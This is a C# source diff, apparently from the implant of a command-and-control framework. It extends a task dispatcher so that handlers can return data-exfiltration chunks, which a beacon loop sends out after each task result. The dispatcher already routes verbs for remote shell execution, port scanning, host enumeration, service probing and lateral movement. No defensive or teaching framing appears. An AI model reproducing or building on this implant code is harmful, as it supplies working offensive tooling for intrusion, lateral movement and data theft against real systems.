@@ -70,22 +70,35 @@ internal sealed class Runner
 
     /// <summary>
     /// Runs <paramref name="verb"/> against <paramref name="arguments"/> and
-    /// returns the wire outcome plus the captured output (combined
-    /// stdout/stderr). An unknown verb reports Failed with a clear message rather
-    /// than throwing, so the operator sees the cause.
+    /// returns the wire outcome, the captured output (combined stdout/stderr),
+    /// and any out-of-band exfil chunks the handler produced. An unknown verb
+    /// reports Failed with a clear message rather than throwing, so the operator
+    /// sees the cause. The chunks list is non-empty only for verbs that stream
+    /// bytes alongside the task result (exfil.push); the beacon loop writes the
+    /// TaskResult first, then iterates the chunks as ExfilChunk frames
+    /// (architecture.md Sec 10.1 exfil). All current handlers return an empty
+    /// list.
     /// </summary>
-    public (TaskOutcome Outcome, string Output) Dispatch(string verb, string arguments)
+    public (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Dispatch(
+        string verb, string arguments)
     {
         return verb switch
         {
-            "shell.exec" => ShellExec(arguments),
-            "recon.portscan" => PortScan(arguments),
-            "recon.hostenum" => HostEnum(arguments),
-            "recon.service" => ServiceProbe(arguments),
-            "lateral.move" => Lateral.Move(arguments, _enroll),
-            _ => (TaskOutcome.Failed, "unknown verb: " + verb),
+            "shell.exec" => WithNoChunks(ShellExec(arguments)),
+            "recon.portscan" => WithNoChunks(PortScan(arguments)),
+            "recon.hostenum" => WithNoChunks(HostEnum(arguments)),
+            "recon.service" => WithNoChunks(ServiceProbe(arguments)),
+            "lateral.move" => WithNoChunks(Lateral.Move(arguments, _enroll)),
+            _ => (TaskOutcome.Failed, "unknown verb: " + verb, Array.Empty<ExfilChunk>()),
         };
     }
+
+    // Lifts a (outcome, output) pair into the three-tuple with an empty chunk
+    // list, so each handler keeps its two-value return shape and only the
+    // dispatcher knows about the out-of-band channel.
+    private static (TaskOutcome, string, IReadOnlyList<ExfilChunk>) WithNoChunks(
+        (TaskOutcome Outcome, string Output) result)
+        => (result.Outcome, result.Output, Array.Empty<ExfilChunk>());
 
     // Runs the argument string through the platform shell and returns the combined
     // output. A non-zero exit is a Failed outcome with the output captured so the
